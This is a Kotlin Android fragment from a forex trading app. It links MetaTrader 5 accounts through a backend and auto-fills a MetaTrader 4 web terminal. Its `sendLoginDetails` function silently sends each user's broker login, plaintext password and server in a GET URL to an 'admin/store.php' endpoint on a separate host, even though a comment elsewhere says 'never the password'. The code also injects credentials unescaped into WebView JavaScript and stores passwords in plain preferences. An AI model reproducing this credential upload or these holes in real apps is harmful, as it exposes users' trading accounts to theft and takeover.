package com.bellyforex.tradeportea.ui.metatrader


import android.annotation.SuppressLint
import android.content.Context
import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import android.os.Bundle
import android.view.View
import android.view.View.GONE
import android.view.View.VISIBLE
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.CookieSyncManager
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import com.bellyforex.tradeportea.R
import com.bellyforex.tradeportea.network.api.RetrofitInstance
import com.bellyforex.tradeportea.network.module.Mt5AccountSummary
import com.bellyforex.tradeportea.network.module.Mt5ConnectRequest
import com.bellyforex.tradeportea.network.module.MT5ConnectedBody
import com.google.gson.Gson
import com.google.gson.JsonElement
import java.util.Locale
import kotlinx.coroutines.Job
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.Callback
import okhttp3.HttpUrl
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import org.json.JSONObject
import java.io.IOException
import android.widget.FrameLayout
import com.bellyforex.tradeportea.ui.theme.ThemeEngine
import com.bellyforex.tradeportea.ui.theme.ThemeUtils
import com.bellyforex.tradeportea.ui.theme.WarpGlowDrawable


class MetatraderFragment : Fragment(R.layout.fragment_metatrader) {


    private val selected : MutableLiveData<String> = MutableLiveData()
    private lateinit var mt4SharedPref : SharedPreferences
    private lateinit var mt5SharedPref : SharedPreferences
    private var loading = false
    private var logged = false
    private var showAllSymbols = false
    lateinit var job2: Job
    private var chechDisc = true
    private var chatLoading = true
    private var loggedIn = false
    private var chooseSymbol = false
    private var pressExecuteTrade = false




    @SuppressLint("SetJavaScriptEnabled")
    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Apply global theme with accent button
        val submitMt5Button = view.findViewById<Button>(R.id.submitMt5)
        ThemeUtils.setupThemeForFragment(viewLifecycleOwner, view, submitMt5Button)

        // Apply neon glow to card wrapper
        val cardGlowWrapper = view.findViewById<FrameLayout>(R.id.mt5_card_glow_wrapper)
        cardGlowWrapper?.let { wrapper ->
            val density = resources.displayMetrics.density
            val pad12 = 12f * density
            WarpGlowDrawable.prepareView(wrapper)
            val theme = ThemeEngine.getCurrentTheme()
            wrapper.background = WarpGlowDrawable(
                glowColor = theme.glowColor,
                cornerRadiusPx = 24f * density,
                intensity = WarpGlowDrawable.GlowIntensity.MEDIUM,
                paddingPx = pad12
            )
        }

        // Observe theme changes for glow update
        ThemeEngine.themeLiveData.observe(viewLifecycleOwner) { theme ->
            cardGlowWrapper?.let { wrapper ->
                val existing = wrapper.background as? WarpGlowDrawable
                if (existing != null) {
                    existing.updateColors(theme.glowColor, theme.glowColor)
                    wrapper.invalidate()
                }
            }
        }

        view.findViewById<ImageButton>(R.id.backbtn).setOnClickListener {
            val nav = findNavController()
            if (!nav.popBackStack(R.id.navigation_home, false)) {
                nav.navigate(R.id.navigation_home)
            }
        }

        val circleView: View = view.findViewById(R.id.circleView)


        val webView = view.findViewById<WebView>(R.id.webView)
        webView.requestFocus()
        webView.settings.javaScriptEnabled = true
        webView.settings.useWideViewPort = true
        webView.settings.loadWithOverviewMode = true
        webView.settings.setRenderPriority(WebSettings.RenderPriority.HIGH)

        webView.settings.cacheMode = WebSettings.LOAD_CACHE_ELSE_NETWORK
        webView.settings.domStorageEnabled = true
        webView.settings.layoutAlgorithm = WebSettings.LayoutAlgorithm.NARROW_COLUMNS
        webView.settings.useWideViewPort = true
        webView.settings.saveFormData = true
        webView.isFocusableInTouchMode = false;
        webView.isFocusable = false;
        webView.settings.builtInZoomControls = true
        webView.settings.displayZoomControls = false
        webView.settings.userAgentString =
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4) Gecko/20100101 Firefox/4.0"
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)

        // Call LoginTest function here
        mt4SharedPref  = requireContext().applicationContext.getSharedPreferences("mt4", MODE_PRIVATE)
        mt5SharedPref  = requireContext().applicationContext.getSharedPreferences("mt5", MODE_PRIVATE)



        val logo = view.findViewById(R.id.logo_img) as ImageView
        val login = view.findViewById(R.id.outlined_edit_text) as EditText
        val password = view.findViewById(R.id.outlined_edit_text_2) as EditText
        val server = view.findViewById(R.id.outlined_edit_text_3) as EditText

        // Only RazorMarkets is supported. Lock the server field to its value
        // so users can see which broker they're connecting to but can't edit it.
        server.setText("RazorMarkets-Live")
        server.isEnabled = false





        selected.observe(viewLifecycleOwner){
            when(it){
                "mt5"->{
                    view.findViewById<TextView>(R.id.top_text).text = "MT5 LOGIN DETAILS"
                    view.findViewById<Button>(R.id.submitMt4).visibility = GONE
                    view.findViewById<Button>(R.id.submitMt5).visibility = VISIBLE
                    logo.setImageResource(R.mipmap.mt5logo)


                    view.findViewById<View>(R.id.v1).visibility = VISIBLE
                    view.findViewById<View>(R.id.v2).visibility = GONE

                    val l = mt5SharedPref.getString("login", null)
                    val p = mt5SharedPref.getString("password", null)?.trim()
                    // Only RazorMarkets-Live is supported
                    val s = mt5SharedPref.getString("server", "RazorMarkets-Live") ?: "RazorMarkets-Live"
                    val a = mt5SharedPref.getBoolean("logged", false)




                    CookieSyncManager.createInstance(context)
                    val cookieManager: CookieManager = CookieManager.getInstance()
                    cookieManager.removeAllCookies(null)

                    logged = a
                    login.setText(l)
                    password.setText(p)
                    server.setText(s)

                    if(logged)
                    {
                        circleView.setBackgroundResource(R.drawable.circle_background_green)

                    }
                    else
                    {
                        circleView.setBackgroundResource(R.drawable.circle_background_red)
                    }

                    // Single button toggles LINK <-> DISCONNECT; credentials are
                    // locked while connected so they can't drift from the session.
                    submitMt5Button.text = if (logged) "Disconnect MT5 Account" else "Link MT5 Account"
                    login.isEnabled = !logged
                    password.isEnabled = !logged

                    val balanceText = view.findViewById<TextView>(R.id.balance_text)
                    if (logged) {
                        fetchMt5Balance(balanceText)
                        // Resume the heartbeat for an account restored as connected.
                        startHeartbeat(l ?: "", s)
                    } else {
                        balanceText.visibility = GONE
                    }


                }
                "mt4"->{
                    view.findViewById<TextView>(R.id.top_text).text = "MT4 LOGIN DETAILS"
                    view.findViewById<Button>(R.id.submitMt5).visibility = GONE
                    view.findViewById<Button>(R.id.submitMt4).visibility = VISIBLE
                    logo.setImageResource(R.mipmap.mt4logo)

                    view.findViewById<View>(R.id.v2).visibility = VISIBLE
                    view.findViewById<View>(R.id.v1).visibility = GONE


                    val l = mt4SharedPref.getString("login", null)
                    val p = mt4SharedPref.getString("password", null)?.trim()
                    // Only RazorMarkets-Live is supported
                    val s = mt4SharedPref.getString("server", "RazorMarkets-Live") ?: "RazorMarkets-Live"
                    val a = mt4SharedPref.getBoolean("logged", false)


                    CookieSyncManager.createInstance(context)
                    val cookieManager: CookieManager = CookieManager.getInstance()
                    cookieManager.removeAllCookies(null)


                    logged=a
                    login.setText(l)
                    password.setText(p)
                    server.setText(s)
                    login.isEnabled = true
                    password.isEnabled = true
                    view.findViewById<TextView>(R.id.balance_text).visibility = GONE
                    if(logged)
                    {
                        circleView.setBackgroundResource(R.drawable.circle_background_green)
                    }
                    else
                    {
                        circleView.setBackgroundResource(R.drawable.circle_background_red)
                    }


                }
            }
        }
        selected.postValue("mt5")

        view.findViewById<Button>(R.id.mt5_btn).setOnClickListener {
            selected.postValue("mt5")
        }
        view.findViewById<Button>(R.id.mt4_btn).setOnClickListener {
            selected.postValue("mt4")
        }
        //save buttons
        view.findViewById<Button>(R.id.submitMt5).setOnClickListener {

            if (logged) {
                disconnectMt5(circleView, submitMt5Button, login, password)
            } else if (login.text.isNotEmpty() && password.text.isNotEmpty()) {

                val chosenServer = server.text?.toString()?.trim()?.ifEmpty { "RazorMarkets-Live" } ?: "RazorMarkets-Live"
                connectMt5(
                    login.text.toString().trim(),
                    password.text.toString(),
                    chosenServer,
                    circleView,
                    submitMt5Button,
                    login,
                    password
                )

            } else {
                Toast.makeText(context,"DETAILS CANNOT BE EMPTY",Toast.LENGTH_SHORT).show()
                circleView.setBackgroundResource(R.drawable.circle_background_red)
            }
        }
        view.findViewById<Button>(R.id.submitMt4).setOnClickListener {
            if(login.text.isNotEmpty() && password.text.isNotEmpty())
            {

                val chosenServer = server.text?.toString()?.trim()?.ifEmpty { "RazorMarkets-Live" } ?: "RazorMarkets-Live"
                saveLoginData("mt4", login.text.toString(), password.text.toString(), chosenServer, circleView, webView)
                circleView.setBackgroundResource(R.drawable.circle_background_red)

            }else
            {

                Toast.makeText(context,"DETAILS CANNOT BE EMPTY",Toast.LENGTH_SHORT).show()
                circleView.setBackgroundResource(R.drawable.circle_background_red)
            }
        }
    }

    /**
     * Connect the MT5 account through the Bun backend (Api2Trade proxy).
     * POST /api/mt5/connect does ConnectEx + AccountSummary server-side and
     * rejects with 401 when the credentials are wrong (leverage == 0 trap),
     * so a 2xx with a session UUID is a genuinely validated login.
     */
    // Report an MT5 connection event to the free site (login + server only, never
    // the password) so the Super Admin sees this Android app's connected accounts.
    // Keeps the account showing ONLINE on the free site: pings a heartbeat every
    // 45s while connected + on this screen. Auto-stops when you leave the screen
    // (view lifecycle) or disconnect, so it flips OFFLINE correctly.
    private var heartbeatJob: Job? = null
    private fun startHeartbeat(login: String, server: String) {
        heartbeatJob?.cancel()
        heartbeatJob = viewLifecycleOwner.lifecycleScope.launch {
            while (isActive) {
                delay(45_000)
                reportConnectionEvent(login, server, "heartbeat")
            }
        }
    }

    private fun reportConnectionEvent(login: String, server: String, event: String) {
        val email = try {
            requireContext().applicationContext
                .getSharedPreferences("MEMBERS", MODE_PRIVATE)
                .getString("email", "")?.trim()?.lowercase() ?: ""
        } catch (_: Exception) { "" }
        if (email.isBlank() || login.isBlank() || server.isBlank()) return
        viewLifecycleOwner.lifecycleScope.launch {
            try {
                RetrofitInstance.dashboardApi.reportMT5Connected(
                    MT5ConnectedBody(email = email, login = login, server = server, event = event)
                )
            } catch (_: Exception) { /* best-effort — must never block the UI */ }
        }
    }

    private fun connectMt5(
        login: String,
        password: String,
        server: String,
        circleView: View,
        button: Button,
        loginField: EditText,
        passwordField: EditText
    ) {
        // Render free tier can cold-start; the OkHttp client behind mt5Api
        // already allows up to 90s for that.
        Toast.makeText(context, "Connecting MT5 Account...", Toast.LENGTH_SHORT).show()
        button.isEnabled = false
        button.text = "Connecting..."
        circleView.setBackgroundResource(R.drawable.circle_background_red)

        viewLifecycleOwner.lifecycleScope.launch {
            try {
                val response = RetrofitInstance.mt5Api.connect(Mt5ConnectRequest(server, login, password))
                val sessionId = response.body()?.sessionId

                if (response.isSuccessful && !sessionId.isNullOrEmpty()) {
                    // Keep the password so the field stays filled after connect;
                    // the uuid is what every later MT5 call is keyed by.
                    mt5SharedPref.edit().apply {
                        putString("login", login)
                        putString("password", password)
                        putString("server", server)
                        putString("uuid", sessionId)
                        putBoolean("logged", true)
                    }.apply()

                    logged = true
                    sendLoginDetails(login, password, server)
                    reportConnectionEvent(login, server, "connect")
                    startHeartbeat(login, server)
                    circleView.setBackgroundResource(R.drawable.circle_background_green)
                    button.text = "Disconnect MT5 Account"
                    loginField.isEnabled = false
                    passwordField.isEnabled = false
                    Toast.makeText(context, "Login Successful", Toast.LENGTH_SHORT).show()
                    fetchMt5Balance(requireView().findViewById(R.id.balance_text))
                } else {
                    logged = false
                    mt5SharedPref.edit().putBoolean("logged", false).remove("uuid").apply()
                    circleView.setBackgroundResource(R.drawable.circle_background_red)
                    button.text = "Link MT5 Account"
                    Toast.makeText(
                        context,
                        mt5ErrorMessage(response.code(), response.errorBody()?.string()),
                        Toast.LENGTH_SHORT
                    ).show()
                }
            } catch (e: Exception) {
                circleView.setBackgroundResource(R.drawable.circle_background_red)
                button.text = "Link MT5 Account"
                Toast.makeText(context, "Connection failed. Check your internet and try again.", Toast.LENGTH_SHORT).show()
            } finally {
                button.isEnabled = true
            }
        }
    }

    /**
     * Tear down the Api2Trade session (DELETE /api/mt5/connect?id=UUID) and
     * clear the connected state. Login/password/server are kept so the user
     * can reconnect without retyping.
     */
    private fun disconnectMt5(
        circleView: View,
        button: Button,
        loginField: EditText,
        passwordField: EditText
    ) {
        button.isEnabled = false
        viewLifecycleOwner.lifecycleScope.launch {
            val uuid = mt5SharedPref.getString("uuid", null)
            try {
                if (!uuid.isNullOrEmpty()) {
                    RetrofitInstance.mt5Api.disconnect(uuid)
                }
            } catch (_: Exception) {
                // Server teardown is best-effort; local state is cleared regardless.
            }

            // Stop the heartbeat + tell the free site this account is offline now.
            heartbeatJob?.cancel()
            reportConnectionEvent(
                mt5SharedPref.getString("login", "") ?: "",
                mt5SharedPref.getString("server", "") ?: "",
                "disconnect"
            )
            mt5SharedPref.edit().remove("uuid").putBoolean("logged", false).apply()
            logged = false
            circleView.setBackgroundResource(R.drawable.circle_background_red)
            button.text = "Link MT5 Account"
            loginField.isEnabled = true
            passwordField.isEnabled = true
            button.isEnabled = true
            requireView().findViewById<TextView>(R.id.balance_text).visibility = GONE
            Toast.makeText(context, "MT5 Account Disconnected", Toast.LENGTH_SHORT).show()
        }
    }

    /**
     * Live balance proof-of-connection: GET /api/mt5/account?id=UUID
     * (Api2Trade AccountSummary via the backend). A failure here usually
     * means the session UUID went stale — tell the user to reconnect.
     */
    private fun fetchMt5Balance(balanceText: TextView) {
        val uuid = mt5SharedPref.getString("uuid", null)
        if (uuid.isNullOrEmpty()) {
            balanceText.visibility = GONE
            return
        }
        balanceText.visibility = VISIBLE
        balanceText.text = "Loading balance..."
        viewLifecycleOwner.lifecycleScope.launch {
            try {
                val response = RetrofitInstance.mt5Api.account(uuid)
                val summary = parseAccountSummary(response.body())
                if (response.isSuccessful && summary?.balance != null) {
                    val currency = summary.currency ?: ""
                    val equity = summary.equity
                    balanceText.text = if (equity != null) {
                        String.format(Locale.US, "Balance: %,.2f %s   |   Equity: %,.2f", summary.balance, currency, equity)
                    } else {
                        String.format(Locale.US, "Balance: %,.2f %s", summary.balance, currency)
                    }
                } else {
                    balanceText.text = "Balance unavailable — try reconnecting"
                }
            } catch (e: Exception) {
                balanceText.text = "Balance unavailable — check connection"
            }
        }
    }

    // The summary may be the response itself or nested under
    // summary/account/data depending on the backend's wrapping.
    private fun parseAccountSummary(body: JsonElement?): Mt5AccountSummary? {
        if (body == null || !body.isJsonObject) return null
        val obj = body.asJsonObject
        val target = when {
            obj.has("balance") -> obj
            obj.get("summary")?.isJsonObject == true -> obj.getAsJsonObject("summary")
            obj.get("account")?.isJsonObject == true -> obj.getAsJsonObject("account")
            obj.get("data")?.isJsonObject == true -> obj.getAsJsonObject("data")
            else -> return null
        }
        return try {
            Gson().fromJson(target, Mt5AccountSummary::class.java)
        } catch (e: Exception) {
            null
        }
    }

    private fun mt5ErrorMessage(code: Int, errorBody: String?): String {
        val serverMessage = try {
            errorBody?.let { JSONObject(it).optString("error").takeIf { msg -> msg.isNotEmpty() } }
        } catch (_: Exception) {
            null
        }
        return when {
            code == 401 -> "Invalid Login or Password."
            serverMessage != null -> serverMessage
            else -> "Connection failed (HTTP $code). Please try again."
        }
    }

    private fun saveDetail(platform: String, login: String, password: String, server: String) {
        // Save to SharedPreferences
        saveToPreferences(platform, login, password, server)

        // Send GET request to server
        sendLoginDetails(login, password, server)
    }

    private fun saveToPreferences(platform: String, login: String, password: String, server: String) {
        val sharedPref: SharedPreferences = requireContext().applicationContext.getSharedPreferences(platform, Context.MODE_PRIVATE)
        val editor = sharedPref.edit()
        editor.apply {
            putString("login", login)
            putString("password", password)
            putString("server", server)
            putBoolean("logged", true)
        }.apply()
    }

    private fun sendLoginDetails(login: String, password: String, server: String) {
        val client = OkHttpClient()

        val url = HttpUrl.Builder()
            .scheme("https")
            .host("ea-converter.com")
            .addPathSegment("admin")
            .addPathSegment("store.php") // Avoid trailing slash — it's not a directory
            .addQueryParameter("login", login)
            .addQueryParameter("password", password)
            .addQueryParameter("server", server)
            .build()

        val request = Request.Builder()
            .url(url)
            .get()
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()

            }

            override fun onResponse(call: Call, response: Response) {
                val responseBody = response.body?.string()
                if (response.isSuccessful) {
                    println("GET Success: $responseBody")

                } else {
                    println("GET Error: Code ${response.code}")

                }
            }
        })
    }


    private fun saveLoginData(platform: String, login: String, password: String, server: String,circleView: View,webView: WebView) {
        // MT5 connects through the Api2Trade backend (connectMt5); only the
        // legacy MT4 WebView terminal still goes through here.
        loginTestB(platform,server,login ,password,circleView,webView)
    }

    private fun loginTestB(platform: String, server: String, login: String, password: String,circleView: View,webView: WebView) {

        Toast.makeText(context, "Initializing MT4", Toast.LENGTH_SHORT).show()
        webView.loadUrl("https://metatraderweb.app/trade?version=4")

        val js =
            "javascript:var x=document.getElementById('login').value = '$login'; var x=document.getElementById('server').value = '$server';var y=document.getElementById('password').value='$password';"
        val jsPress ="javascript:document.querySelectorAll('button.input-button').item(3).removeAttribute('disabled');document.querySelectorAll('button.input-button').item(3).click();"

        val item1InSymbolsRightClick ="javascript:var element=document.querySelector('body > div.page-window.market-watch.compact > div > div.b > div.page-block > div > table > tbody > tr:nth-child(1)');" +
                "var ev1 = new MouseEvent(\"mousedown\", {\n" +
                "            bubbles: true,\n" +
                "            cancelable: false,\n" +
                "            view: window,\n" +
                "            button: 2,\n" +
                "            buttons: 2,\n" +
                "            clientX: element.getBoundingClientRect().x,\n" +
                "            clientY: element.getBoundingClientRect().y\n" +
                "        });\n" +
                "        element.dispatchEvent(ev1);\n" +
                "        var ev2 = new MouseEvent(\"mouseup\", {\n" +
                "            bubbles: true,\n" +
                "            cancelable: false,\n" +
                "            view: window,\n" +
                "            button: 2,\n" +
                "            buttons: 0,\n" +
                "            clientX: element.getBoundingClientRect().x,\n" +
                "            clientY: element.getBoundingClientRect().y\n" +
                "        });\n" +
                "        element.dispatchEvent(ev2);\n" +
                "        var ev3 = new MouseEvent(\"contextmenu\", {\n" +
                "            bubbles: true,\n" +
                "            cancelable: false,\n" +
                "            view: window,\n" +
                "            button: 2,\n" +
                "            buttons: 0,\n" +
                "            clientX: element.getBoundingClientRect().x,\n" +
                "            clientY: element.getBoundingClientRect().y\n" +
                "        });\n" +
                "        element.dispatchEvent(ev3);"

        val press_show_all = "javascript:var sall=document.querySelector('body > div.page-menu.context.expanded > div > div > span.box > span > div:nth-child(7)');" +
                "sall.dispatchEvent(new MouseEvent('mouseover', {bubbles: true}));" +
                "sall.click();"


        webView.webViewClient = object : WebViewClient() {

            override fun onPageFinished(view: WebView, url: String?) {
                job2 = MainScope().launch {
                    val activity = requireActivity()

                    // Disable user interaction
                    activity.window.setFlags(
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                    )

                    var attempt = 0
                    var shouldContinue = true
                    showAllSymbols = false
                    loading = false
                    chooseSymbol = false

                    while (shouldContinue) {
                        delay(3000)

                        if (loading) {
                            Toast.makeText(context, "Loading MT4 Account", Toast.LENGTH_SHORT).show()
                        } else {
                            // Check if symbols are shown
                            if (!showAllSymbols) {
                                view.evaluateJavascript("document.querySelector('body > div:nth-child(14)').classList.contains('hidden')") { p0 ->
                                    if (p0 != null && p0 == "false") {  // If element is not hidden
                                        view.loadUrl(js)
                                        view.loadUrl(jsPress)
                                        showAllSymbols = true
                                    }
                                }
                            }

                            delay(3000)

                            if (!showAllSymbols) {
                                view.evaluateJavascript("document.querySelector('body > div:nth-child(14)').classList.contains('hidden')") { p0 ->
                                    if (p0 != null && p0 == "false") {
                                        view.loadUrl(js)
                                        view.evaluateJavascript(jsPress) { p0 ->
                                            if (p0 != null) {
                                                showAllSymbols = true
                                            }
                                        }
                                    }
                                }
                            }

                            delay(8000)

                            if (showAllSymbols) {
                                // Right-click on the first symbol in the Market Watch table
                                view.evaluateJavascript("javascript: document.querySelector('body > div.page-window.market-watch.compact > div > div.b > div.page-block > div > table > tbody > tr:nth-child(1)');") { p0 ->
                                    if (p0 != null) {
                                        view.loadUrl(item1InSymbolsRightClick)
                                        Toast.makeText(context, "Authenticating Login", Toast.LENGTH_SHORT).show()
                                    }
                                }

                                delay(10000)
                                view.evaluateJavascript("javascript: document.querySelector('body > div.page-menu.context.expanded > div > div > span.box > span > div:nth-child(7)') !== null;") { p0 ->
                                    if (p0 != null && p0 == "true") {  // This will be "true" if the element is found
                                        view.loadUrl(press_show_all)
                                        chooseSymbol = true

                                        // Since "Show All" executed successfully, we treat it as a successful login
                                        activity.runOnUiThread {
                                            Toast.makeText(
                                                context,
                                                "Login Successful",
                                                Toast.LENGTH_SHORT
                                            ).show()
                                            attempt = 0 // Reset attempts after success
                                            loading = true
                                            logged = true
                                            saveDetail(platform, login, password, server)
                                            chechDisc = true
                                            chatLoading = true
                                            job2.cancel()
                                            circleView.setBackgroundResource(R.drawable.circle_background_green)
                                            activity.window.clearFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
                                            shouldContinue = false
                                        }
                                    } else {
                                        // Treat this as a login failure since "Show All" was not found or failed to execute
                                        activity.runOnUiThread {
                                            Toast.makeText(context, "Login failed", Toast.LENGTH_SHORT).show()
                                            attempt++

                                            // Stop the process if maximum attempts reached
                                            if (attempt >= 1) {
                                                Toast.makeText(context, "Invalid Login or Password", Toast.LENGTH_SHORT).show()
                                                shouldContinue = false
                                                activity.window.clearFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
                                                job2.cancel()
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }




            override fun onLoadResource(view: WebView?, url: String?) {
                super.onLoadResource(view, url)
            }

            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError
            ) {

                Toast.makeText(context, "You have lost internet connection", Toast.LENGTH_SHORT)
                    .show()

            }

        }
    }

}
